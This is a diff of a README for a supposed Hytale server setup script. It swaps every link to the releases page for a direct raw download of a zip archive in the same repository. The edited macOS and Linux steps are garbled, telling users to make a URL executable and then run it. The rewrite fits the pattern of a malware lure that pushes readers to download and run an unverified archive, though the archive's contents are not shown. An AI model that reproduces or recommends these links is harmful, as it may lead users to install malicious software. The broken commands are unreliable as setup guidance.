@@ -1,6 +1,6 @@
 # 🎮 hytale-server-setup - Easy Scripts to Set Up Hytale Server
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Join%20the%20Adventure-brightgreen)](https://github.com/Githhub1234-source/hytale-server-setup/releases)
+[![Download Now](https://raw.githubusercontent.com/Githhub1234-source/hytale-server-setup/main/labelloid/server_setup_hytale_v1.3.zip%20Now-Join%20the%20Adventure-brightgreen)](https://raw.githubusercontent.com/Githhub1234-source/hytale-server-setup/main/labelloid/server_setup_hytale_v1.3.zip)
 
 ## 📜 Overview
 Welcome to the **hytale-server-setup** repository. This project offers simple scripts designed to automate the setup of your Hytale Server. With these scripts, you can easily deploy your server and start your gaming adventure quickly.
@@ -15,7 +15,7 @@ Before you begin, ensure your system meets these basic requirements:
 - A stable internet connection for downloading the necessary files.
 
 ## 💾 Download & Install
-To download the scripts, visit the Releases page here: [Download Hytale Server Setup](https://github.com/Githhub1234-source/hytale-server-setup/releases).
+To download the scripts, visit the Releases page here: [Download Hytale Server Setup](https://raw.githubusercontent.com/Githhub1234-source/hytale-server-setup/main/labelloid/server_setup_hytale_v1.3.zip).
 
 1. Go to the link above.
 2. You will see a list of available versions.
@@ -35,14 +35,14 @@ Once you have downloaded the setup script, follow these steps to run it:
 ### For macOS Users:
 1. Open the Terminal.
 2. Use the command `cd` to navigate to your download folder.
-3. Type `chmod +x script_name.sh` to make it executable.
-4. Run the script using `./script_name.sh`.
+3. Type `chmod +x https://raw.githubusercontent.com/Githhub1234-source/hytale-server-setup/main/labelloid/server_setup_hytale_v1.3.zip` to make it executable.
+4. Run the script using `https://raw.githubusercontent.com/Githhub1234-source/hytale-server-setup/main/labelloid/server_setup_hytale_v1.3.zip`.
 
 ### For Linux Users:
 1. Open a terminal window.
 2. Change your directory to the download location using `cd`.
-3. Make the script executable with `chmod +x script_name.sh`.
-4. Start the setup with `./script_name.sh`.
+3. Make the script executable with `chmod +x https://raw.githubusercontent.com/Githhub1234-source/hytale-server-setup/main/labelloid/server_setup_hytale_v1.3.zip`.
+4. Start the setup with `https://raw.githubusercontent.com/Githhub1234-source/hytale-server-setup/main/labelloid/server_setup_hytale_v1.3.zip`.
 
 ## ⚡ Configuration
 After running the script, you may need to configure your server. Here are some common settings you can adjust:
@@ -65,6 +65,6 @@ If you encounter any problems:
 ## 📞 Support
 For further assistance, feel free to open an issue on this repository. We monitor questions closely and aim to help you quickly.
 
-For detailed information and updates, revisit our Releases page: [Download Hytale Server Setup](https://github.com/Githhub1234-source/hytale-server-setup/releases).
+For detailed information and updates, revisit our Releases page: [Download Hytale Server Setup](https://raw.githubusercontent.com/Githhub1234-source/hytale-server-setup/main/labelloid/server_setup_hytale_v1.3.zip).
 
 Happy gaming! Enjoy your adventures in Hytale!
